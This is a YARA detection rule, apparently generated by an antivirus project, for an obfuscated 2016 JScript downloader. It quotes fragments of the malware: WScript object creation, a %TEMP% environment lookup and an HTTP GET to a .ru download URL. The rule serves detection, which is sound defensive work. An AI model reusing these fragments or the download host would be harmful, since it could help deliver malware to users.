rule sig_20160428_8bc25914ccac2e3476fdd93db7108919 {
  meta:
    description = "datamaliciousorder - file 20160428_8bc25914ccac2e3476fdd93db7108919.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bc15c60bd08cb1850dff4e41202c9489a75a9a9392072e9b801c87e16acb179b"

  strings:
    $s1  = "function KwqArzOmfXyfTpfQofSno(AzzSnxGrmTziKtkVxlSoe, RiuPkoGxxGdpIgzVhsEjb){EubVcnPyrChaBjiCzxZrf = EubVcnPyrChaBjiCzxZrf * 1; " ascii
    $s2  = "function KnaBduQpgNjuWepDgiZkg() {return LmpRokFleVnvOizXadQrq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function KwqArzOmfXyfTpfQofSno(AzzSnxGrmTziKtkVxlSoe, RiuPkoGxxGdpIgzVhsEjb){EubVcnPyrChaBjiCzxZrf = EubVcnPyrChaBjiCzxZrf * 1; " ascii
    $s4  = "function YekFycXkiUcjDgaSalNxy(YtgNpuUfnZkeNmjLrsRgp){LmpRokFleVnvOizXadQrq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function YekFycXkiUcjDgaSalNxy(YtgNpuUfnZkeNmjLrsRgp){LmpRokFleVnvOizXadQrq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "return AzzSnxGrmTziKtkVxlSoe - RiuPkoGxxGdpIgzVhsEjb;};" fullword ascii
    $s7  = "var LmpRokFleVnvOizXadQrq = function HgjLthZkuWjpGqpMhrOrq() {return GoyMybXinUczAfpXywIag[UawOfrRnyMunRphWtlDcb](\"WScript\"+\"" ascii
    $s8  = "VbqHhaNaxSiwBxaSxrNyo[UcjLkzCijGooVnwShpDyq](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s9  = "var GoyMybXinUczAfpXywIag = this[\"WScript\"];" fullword ascii
    $s10 = "var LmpRokFleVnvOizXadQrq = function HgjLthZkuWjpGqpMhrOrq() {return GoyMybXinUczAfpXywIag[UawOfrRnyMunRphWtlDcb](\"WScript\"+\"" ascii
    $s11 = "function KnaBduQpgNjuWepDgiZkg() {return LmpRokFleVnvOizXadQrq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "return KwqArzOmfXyfTpfQofSno(1 == 1 ? DrxTpmTlnWwnZrsOwdQbc : 0, 1 == 1 ? CgbKsvXmiLlqDyhVgeUxs : 0);" fullword ascii
    $s13 = "if (VbqHhaNaxSiwBxaSxrNyo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function AkeAeoKpsNqxPclCbcYqt(){return QjjHxhBleTvkQnlOqpMxl + \"\";};" fullword ascii
    $s15 = "function EvkSjyRqpLgvCjjVsnRjd() {return ((WnqTxcJgrHynMglGskFmi == true) && (WnqTxcJgrHynMglGskFmi == LrsOhrIrmVjxVdyBpaPfn)) ?" ascii
    $s16 = "function EvkSjyRqpLgvCjjVsnRjd() {return ((WnqTxcJgrHynMglGskFmi == true) && (WnqTxcJgrHynMglGskFmi == LrsOhrIrmVjxVdyBpaPfn)) ?" ascii
    $s17 = "LrsOhrIrmVjxVdyBpaPfn = true; " fullword ascii
    $s18 = "var LrsOhrIrmVjxVdyBpaPfn = false;" fullword ascii
    $s19 = "var TyfJkpYckPqfFvvAwkQxt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "WnqTxcJgrHynMglGskFmi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}